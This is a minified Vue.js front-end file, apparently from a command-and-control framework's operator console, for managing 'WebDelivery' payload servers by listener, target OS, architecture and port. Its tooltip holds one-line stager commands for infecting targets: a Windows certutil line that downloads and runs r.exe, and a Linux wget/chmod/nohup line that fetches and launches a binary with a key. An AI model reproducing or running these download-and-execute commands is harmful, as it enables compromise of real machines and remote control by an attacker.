import{_ as G}from"./index-88aec585.js";/* empty css                  *//* empty css                   *//* empty css                *//* empty css                     *//* empty css                 *//* empty css               *//* empty css                  *//* empty css                 *//* empty css                    */import{C as p}from"./index-926bd281.js";import{a as n,o as H,t as j,r as J,D as K,u as Q,w as X,x as Y,y as ee,z as te,A as le,p as ae,v as oe}from"./element-61b2a7f7.js";import{H as se,r as h,_ as L,d as ne,l as r,m as v,V as t,P as o,T as i,U as re,O as _,S as V,p as D,F as C,a8 as S,az as ie,aA as de}from"./vue-95bbca75.js";const O=f=>(ie("data-v-3e9d3f83"),f=f(),de(),f),ue=O(()=>D("br",null,null,-1)),pe=O(()=>D("br",null,null,-1)),me={class:"form-container"},ce=se({__name:"WebDelivery",setup(f){const k=h([]),b=h(!1),x=h([]),I=async()=>{const a=await p.ShowListener();a.status===200?a.data.status===200?x.value=a.data.data:n.error(a.data.data):n.error("Something wrong")},P=[{label:"windows",value:"windows"},{label:"linux",value:"linux"},{label:"darwin",value:"darwin"}],z={windows:["amd64","386"],linux:["amd64","386","arm","arm64","loong64","mips","mipsle","mips64","mips64le"],darwin:["amd64","arm64"]},s=L({port:"",listener:"",os:"",arch:"",filename:""}),w=L([]),N=a=>{s.arch="",w.splice(0,w.length,...z[a]||[])},m=async()=>{const a=await p.GetWebDeliveryList();a.status===200?a.data.status===200?k.value=a.data.data:n.error(a.data.data):n.error("Something wrong")},$=async()=>{const a=await p.StartWebDelivery({listener:s.listener,os:s.os,arch:s.arch,port:s.port,filename:s.filename});a.status===200?a.data.status===200?(n.success("添加成功"),await m()):n.error(a.data.data):n.error("Something wrong"),b.value=!1},U=async a=>{const l=await p.CloseWebDelivery({port:a.ListeningPort});l.status===200&&l.data.status===200&&(n.success("关闭成功"),await m())},A=async a=>{const l=await p.OpenWebDelivery({port:a.ListeningPort});l.status===200&&l.data.status===200&&(n.success("开启成功"),await m())},F=async a=>{const l=await p.DeleteWebDelivery({port:a.ListeningPort});l.status===200&&l.data.status===200&&(n.success("删除成功"),await m())};return ne(async()=>{await m()}),(a,l)=>{const d=H,u=j,B=J,T=K,R=Q,y=oe,g=X,c=Y,E=ee,M=te,q=le,Z=ae;return r(),v("div",null,[t(d,{type:"primary",size:"default",onClick:l[0]||(l[0]=e=>b.value=!0)},{default:o(()=>[i(" 新增 WebDelivery ")]),_:1}),ue,pe,t(R,{data:k.value},{default:o(()=>[t(u,{prop:"ListenerConfig",label:"Listener"}),t(u,{prop:"OS",label:"操作系统",width:"150"}),t(u,{prop:"Arch",label:"架构",width:"150"}),t(u,{prop:"ListeningPort",label:"监听端口",width:"150"}),t(u,{label:"状态",prop:"Status",width:"150"},{default:o(({row:e})=>[t(B,{type:e.Status===1?"success":"danger",size:"default"},{default:o(()=>[i(re(e.Status===1?"开启":"关闭"),1)]),_:2},1032,["type"])]),_:1}),t(u,{label:"操作"},{default:o(e=>[t(T,{placement:"top",width:500,trigger:"click",content:e.row.os==="windows"?`certutil -urlcache -split -f ${e.row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe tNROopcR45q4Z8I1`:`wget -P /tmp ${e.row.ServerAddress}; chmod +x /tmp/${e.row.FileName}; nohup /tmp/${e.row.FileName} tNROopcR45q4Z8I1 > m.log 2>&1 &`},{reference:o(()=>[e.row.Status===1?(r(),_(d,{key:0,size:"small",type:"success"},{default:o(()=>[i("上线命令")]),_:1})):V("",!0)]),_:2},1032,["content"]),e.row.Status===2?(r(),_(d,{key:0,size:"small",type:"success",onClick:W=>A(e.row)},{default:o(()=>[i("开启")]),_:2},1032,["onClick"])):V("",!0),e.row.Status===1?(r(),_(d,{key:1,size:"small",type:"primary",onClick:W=>U(e.row)},{default:o(()=>[i("关闭")]),_:2},1032,["onClick"])):V("",!0),t(d,{size:"small",type:"danger",onClick:W=>F(e.row)},{default:o(()=>[i("删除")]),_:2},1032,["onClick"])]),_:1})]),_:1},8,["data"]),t(Z,{modelValue:b.value,"onUpdate:modelValue":l[6]||(l[6]=e=>b.value=e),title:"配置WebDelivery"},{default:o(()=>[t(q,{class:"box-card"},{default:o(()=>[D("div",me,[t(M,{model:s,"label-width":"120px"},{default:o(()=>[t(c,{label:"Listener"},{default:o(()=>[t(g,{modelValue:s.listener,"onUpdate:modelValue":l[1]||(l[1]=e=>s.listener=e),placeholder:"选择listener",onVisibleChange:I},{default:o(()=>[(r(!0),v(C,null,S(x.value,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1}),t(c,{label:"操作系统"},{default:o(()=>[t(g,{modelValue:s.os,"onUpdate:modelValue":l[2]||(l[2]=e=>s.os=e),placeholder:"选择操作系统",onChange:N},{default:o(()=>[(r(),v(C,null,S(P,e=>t(y,{key:e.value,label:e.label,value:e.value},null,8,["label","value"])),64))]),_:1},8,["modelValue"])]),_:1}),t(c,{label:"架构"},{default:o(()=>[t(g,{modelValue:s.arch,"onUpdate:modelValue":l[3]||(l[3]=e=>s.arch=e),placeholder:"选择架构",disabled:w.length===0},{default:o(()=>[(r(!0),v(C,null,S(w,e=>(r(),_(y,{key:e,label:e,value:e},null,8,["label","value"]))),128))]),_:1},8,["modelValue","disabled"])]),_:1}),t(c,{label:"监听端口"},{default:o(()=>[t(E,{modelValue:s.port,"onUpdate:modelValue":l[4]||(l[4]=e=>s.port=e),style:{width:"200px"},placeholder:"输入监听端口"},null,8,["modelValue"])]),_:1}),t(c,{label:"文件名称"},{default:o(()=>[t(E,{modelValue:s.filename,"onUpdate:modelValue":l[5]||(l[5]=e=>s.filename=e),style:{width:"200px"},placeholder:"输入挂载的文件名称"},null,8,["modelValue"])]),_:1})]),_:1},8,["model"]),t(d,{type:"primary",onClick:$,disabled:!s.os||!s.arch},{default:o(()=>[i(" 确定 ")]),_:1},8,["disabled"])])]),_:1})]),_:1},8,["modelValue"])])}}});const xe=G(ce,[["__scopeId","data-v-3e9d3f83"]]);export{xe as default};
